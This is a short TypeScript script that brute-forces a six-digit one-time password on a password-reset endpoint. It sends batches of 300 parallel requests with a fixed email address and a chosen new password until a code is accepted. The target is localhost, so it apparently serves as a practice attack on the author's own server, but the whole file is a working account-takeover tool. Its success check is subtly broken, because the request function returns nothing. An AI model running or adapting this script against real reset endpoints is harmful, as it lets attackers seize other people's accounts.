import axios from 'axios'


async function sendRequest(otp: string) {
    let data = JSON.stringify({
        "email": "nxvtej@gmail.com",
        "otp": otp,
        "newPassword": "1234789"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };



    await axios.request(config)
        .then((response) => {
            console.log(JSON.stringify(response.data));
        })
        .catch((error) => {
            // console.log(`Failed  ${otp}`);
        });

}


async function main() {

    let resetDone = false;
    for (let i = 240000; i <= 999999; i += 300) {
        console.log(i);


        if (resetDone) { break; }
        const p = [];

        for (let j = 0; j < 300; j++) {
            p.push(sendRequest((i + j).toString()))
        }
        const data = await Promise.all(p);
        data.forEach(element => {

            if (element !== null && element !== undefined) {
                console.log(element);
                // process.exit(1);
                resetDone = true;
            }
        });
        // console.log(p.length);
    }
}


main();
